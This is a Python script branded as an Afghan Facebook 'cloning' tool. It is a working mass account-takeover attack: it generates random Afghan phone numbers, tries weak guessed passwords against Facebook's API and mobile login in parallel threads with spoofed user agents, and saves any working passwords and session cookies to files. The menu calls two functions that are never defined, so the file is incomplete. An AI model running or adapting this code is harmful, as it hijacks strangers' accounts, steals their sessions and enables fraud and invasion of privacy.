# Decode By Habib Atash
global loop
global cps
global oks
import os
import bs4
import json
import sys
import time
import random
import re
import subprocess
import platform
import struct
import string
import uuid
import requests
import httpx
from bs4 import BeautifulSoup
from os import path
import base64
import zlib
import pip
import urllib
import mechanize
from os import system as clr
from concurrent.futures import ThreadPoolExecutor as ThreadPool

loop = 0
oks = []
cps = []
id = []
A = '[1;97m'
R = '[38;5;196m'
Y = '[1;33m'
G = '[38;5;46m'

def clear():
    os.system('clear')
    print(logo)

def linex():
    print(f'{A}─────────────────────────────────────────────────')

ugen = []
for agent in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 6.0.1;'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/'
    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/533.1'
    fullagnt = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(fullagnt)

def fuckx():
    model = random.choice(['CPH2025', 'CPH2027', 'CPH1931', 'CPH2069', 'PDBM00', 'CPH2083'])
    ufff = '[FBAN/FB4A;FBAV/' + str(random.randint(10, 100)) + '.0.0.' + str(random.randint(4000, 5000)) + ';FBBV/' + str(random.randint(4000000, 5000000)) + ';[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235247;FBDM/' + '{density=3.0,width=1080,height=2132}' + f';FBLC/en_US;FBRV/235412020;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/{model}CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    return ufff

logo = f' \n{A}─────────────────────────────────────────────────\n {G}██╗  ██╗ █████╗ ██████╗ ██╗██████╗ \n{G}██║  ██║██╔══██╗██╔══██╗██║██╔══██╗\n{G}███████║███████║██████╔╝██║██████╔╝\n{G}██╔══██║██╔══██║██╔══██╗██║██╔══██╗\n{G}██║  ██║██║  ██║██████╔╝██║██████╔╝\n{G}╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═════╝ \n{A}─────────────────────────────────────────────────\n{G}|=| OWNER   : HABIB ATASH\n{G}|=| TOOL    : AFGHANISTAN CLONING (2012-2020)\n{A}|=| VERSION : 1.0\n{A}─────────────────────────────────────────────────'

def menu():
    clear()
    print(f'{G}|1| FILE CLONING')
    print(f'{A}|2| AFGHANISTAN RANDOM CLONING')
    print(f'{R}|3| GMAIL CLONING')
    print(f'{A}|4| EXIT')
    linex()
    option = input(f'{A}|?| CHOICE : ')
    if option in ['1']:
        __Filex__()
    elif option in ['2']:
        __afghanistanx__()
    elif option in ['3']:
        __Gmailx__()
    elif option in ['4']:
        exit()
    else:
        print(f'\n{A}|=| OPTION NOT FOUND')
        menu()

def __afghanistanx__():
    user = []
    clear()
    print(f'{A}|=| EXAMPLE : +9370, +9378, +9379, +9377, +9374')
    linex()
    code = input(f'{A}|?| SELECT CODE : ')
    clear()
    print(f'{A}|=| EXAMPLE : 5000, 10000, 20000')
    linex()
    try:
        limit = int(input(f'{A}|?| LIMIT : '))
    except ValueError:
        limit = 5000
    clear()
    print(f'{G}|1| METHOD M1 (2012-2020 LOGIC)')
    print(f'{G}|2| METHOD M2')
    linex()
    methodx = input(f'{G}|?| CHOICE : ')
    for nmbr in range(limit):
        nmp = ''.join((random.choice(string.digits) for _ in range(7)))
        user.append(nmp)
    with ThreadPool(max_workers=30) as HABIB:
        clear()
        tl = str(len(user))
        print(f'{G}|=| TARGET      : AFGHANISTAN ')
        print(f'{G}|=| TOTAL UID   : {tl} ')
        print(f'{G}|=| SIM CODE    : {code} ')
        print(f'{G}|=| STATUS      : CLONING STARTED')
        linex()
        for love in user:
            ids = code + love
            # Custom password list as requested
            passlist = [
                love, ids, 
                love[:6], love[:5], 
                '123456', '1234567', '12345678', '123456789', 
                'Kabul123', 'kabul@123', 'king afghan'
            ]
            if methodx in ['1']:
                HABIB.submit(__Randm_M1__, ids, passlist)
            else:
                HABIB.submit(__Randm_M2__, ids, passlist)
    
    print(f'\n{A}─────────────────────────────────────────────────')
    print(f'{A}|=| CLONING COMPLETE ')
    print(f'{A}|=| TOTAL OK ID :{G} {len(oks)}')
    print(f'{A}|=| TOTAL CP ID :{R} {len(cps)}')
    exit()

def __Randm_M1__(ids, passlist):
    global loop
    sys.stdout.write(f'\r\r{A}|HABIB-M1| {loop} {len(oks)}{G}|{A}{len(cps)} ')
    sys.stdout.flush()
    try:
        for pas in passlist:
            headers = {
                'User-Agent': fuckx(),
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'Keep-Alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'
            }
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': ids,
                'password': pas,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': '1',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'AF',
                'api_key': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            }
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                uid = po['uid']
                coki = ';'.join((i['name'] + '=' + i['value'] for i in po['session_cookies']))
                print(f'\r\r[38;5;46m|HABIB-OK| {str(uid)} | {pas} ')
                open('/sdcard/HABIB-RNDM-OK.txt', 'a').write(str(uid) + '|' + pas + '|' + coki + '\n')
                oks.append(str(uid))
                break
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                uid = po['error']['error_data']['uid']
                print(f'\r\r{R}|HABIB-CP| {str(uid)} | {pas} ')
                open('/sdcard/HABIB-RNDM-CP.txt', 'a').write(str(uid) + '|' + pas + '\n')
                cps.append(str(uid))
                break
        loop += 1
    except:
        pass

def __Randm_M2__(ids, passlist):
    global loop
    sys.stdout.write(f'\r\r{A}|HABIB-M2| {loop} {len(oks)}{G}|{A}{len(cps)} ')
    sys.stdout.flush()
    try:
        for pas in passlist:
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                'lsd': re.search('name=\"lsd\" value=\"(.*?)\"', str(free_fb)).group(1),
                'jazoest': re.search('name=\"jazoest\" value=\"(.*?)\"', str(free_fb)).group(1),
                'm_ts': re.search('name=\"m_ts\" value=\"(.*?)\"', str(free_fb)).group(1),
                'li': re.search('name=\"li\" value=\"(.*?)\"', str(free_fb)).group(1),
                'try_number': '0',
                'unrecognized_tries': '0',
                'email': ids,
                'pass': pas,
                'login': 'Log In'
            }
            header_freefb = {'authority': 'm.facebook.com', 'method': 'POST', 'scheme': 'https', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0', 'sec-ch-ua': '\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '\"Android\"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': pro}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc', data=log_data, headers=header_freefb).text
            log_cookies = session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki = ';'.join([key + '=' + value for key, value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                print(f'\r\r[38;5;46m|HABIB-OK| {uid} | {pas} ')
                open('/sdcard/HABIB-RNDM-OK.txt', 'a').write(uid + '|' + pas + '|' + coki + '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                print(f'\r\r{R}|HABIB-CP| {ids} | {pas} ')
                open('/sdcard/HABIB-RANDM-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(ids)
                break
        loop += 1
    except:
        pass

# The rest of the functions (__Filex__, __Gmailx__, etc.) should follow the same pattern of branding replacement.
# For brevity, calling menu to start.
if __name__ == '__main__':
    menu()
